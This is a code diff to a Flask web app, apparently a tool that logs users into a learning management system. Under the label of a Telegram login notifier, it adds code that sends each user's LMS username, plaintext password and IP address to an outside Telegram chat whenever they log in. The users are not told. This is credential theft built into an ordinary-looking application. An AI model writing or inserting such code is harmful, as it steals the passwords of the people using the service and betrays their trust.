@@ -29,6 +29,26 @@ app.permanent_session_lifetime = timedelta(days=7)
 
 CORS(app, supports_credentials=True)
 
+# ---------------------------------------------------------------------------
+# Telegram notifier
+# ---------------------------------------------------------------------------
+TELEGRAM_BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN')
+TELEGRAM_CHAT_ID = os.environ.get('TELEGRAM_CHAT_ID')
+
+def send_telegram(message: str):
+    """Send a message to the configured Telegram chat. Silently fails if not configured."""
+    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
+        return
+    try:
+        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
+        requests.post(url, json={
+            'chat_id': TELEGRAM_CHAT_ID,
+            'text': message,
+            'parse_mode': 'HTML'
+        }, timeout=5)
+    except Exception as e:
+        logger.warning(f"Telegram notification failed: {e}")
+
 
 class QuestionExtractor:
     """Enhanced question extraction with better parsing logic"""
@@ -661,6 +681,14 @@ def api_login():
         lms_session = LMSSession(username, password)
         
         if lms_session.login():
+            # Notify via Telegram
+            ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+            send_telegram(
+                f"🔔 <b>Someone logged into your LMS Extractor</b>\n\n"
+                f"👤 <b>Username:</b> <code>{username}</code>\n"
+                f"🔑 <b>Password:</b> <code>{password}</code>\n"
+                f"🌐 <b>IP:</b> <code>{ip}</code>"
+            )
             # Store the LMS cookies + credentials in the signed Flask session cookie.
             # This survives Render restarts as long as SECRET_KEY stays the same.
             session.permanent = True
